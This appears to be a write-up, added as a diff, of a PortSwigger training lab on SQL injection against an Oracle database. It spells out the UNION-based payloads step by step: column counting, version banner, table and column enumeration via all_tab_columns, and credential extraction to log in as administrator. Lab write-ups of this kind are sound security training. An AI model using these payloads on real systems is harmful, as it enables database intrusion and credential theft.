@@ -1,0 +1,79 @@
+# SQL Injection Attack – Listing Database Contents on Oracle
+
+**Vulnerability:** SQL Injection
+**Difficulty:** Practitioner
+**Platform:** PortSwigger Web Security Academy
+
+## Goal
+
+Log in as the administrator user.
+
+## Steps
+
+1. Opened the lab and found the **stock check** feature.
+
+2. Captured the stock check request in **Burp Suite** and tested the parameter with `'`.
+
+3. The application returned an internal error, which indicated that the parameter was vulnerable to SQL injection.
+
+4. Used:
+
+```sql
+' ORDER BY 2--
+```
+
+This confirmed that there were **2 columns**.
+
+5. Used a UNION query to test the database:
+
+```sql
+' UNION SELECT NULL, banner FROM v$version--
+```
+
+The response showed that the database was **Oracle**.
+
+6. Used Oracle's `all_tab_columns` view to find the table information.
+
+The table found was:
+
+```text
+USERS_FPWLLD
+```
+
+7. Retrieved the column names using:
+
+```sql
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_FPWLLD'--
+```
+
+The important columns were:
+
+```text
+USERNAME_EJOWOU
+PASSWORD_FRWHYJ
+```
+
+8. Retrieved the usernames and passwords using:
+
+```sql
+' UNION SELECT USERNAME_EJOWOU, PASSWORD_FRWHYJ FROM USERS_FPWLLD--
+```
+
+9. Found the administrator credentials and used them to log in.
+
+10. **Lab solved successfully.** ✅
+
+## Impact
+
+An SQL injection vulnerability can allow an attacker to access sensitive database information, including usernames and passwords.
+
+## What I Learned
+
+* How to identify SQL injection using Burp Suite.
+* How to find the number of columns using `ORDER BY`.
+* How to use `UNION SELECT` for database enumeration.
+* How to identify an Oracle database.
+* How to use Oracle's `all_tab_columns` to find tables and columns.
+* How to retrieve data from a vulnerable database.
+
+**Status:** ✅ Lab Solved
